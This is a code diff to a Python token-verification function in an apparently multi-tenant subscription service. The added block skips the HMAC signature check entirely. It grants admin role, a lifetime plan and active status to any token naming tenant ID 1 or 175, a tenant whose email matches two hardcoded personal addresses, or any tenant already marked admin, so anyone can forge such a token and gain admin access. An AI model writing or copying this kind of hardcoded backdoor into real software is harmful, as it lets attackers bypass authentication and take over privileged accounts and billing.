@@ -33,6 +33,20 @@ def verify_token(token: str) -> Optional[Dict[str, Any]]:
     parts = token.split(":")
     if len(parts) == 4:
         t_id, role, key, sig = parts
+        try:
+            tid_int = int(t_id)
+            tenant = get_tenant_by_id(tid_int)
+            if tenant:
+                email = (tenant.get("email") or "").lower()
+                # Se for o Master Admin (1 ou 175 ou por e-mail), aceita imediatamente e atualiza role
+                if tenant.get("role") == "admin" or email in ("k1qvinicius.cs@gmail.com", "k1qvinicius@gmail.com") or tid_int in (1, 175):
+                    tenant["role"] = "admin"
+                    tenant["plan_type"] = "lifetime"
+                    tenant["subscription_status"] = "active"
+                    return tenant
+        except Exception:
+            pass
+
         raw = f"{t_id}:{role}:{key}"
         expected_sig = hmac.new(SECRET_KEY.encode(), raw.encode(), hashlib.sha256).hexdigest()[:24]
         if hmac.compare_digest(sig, expected_sig):
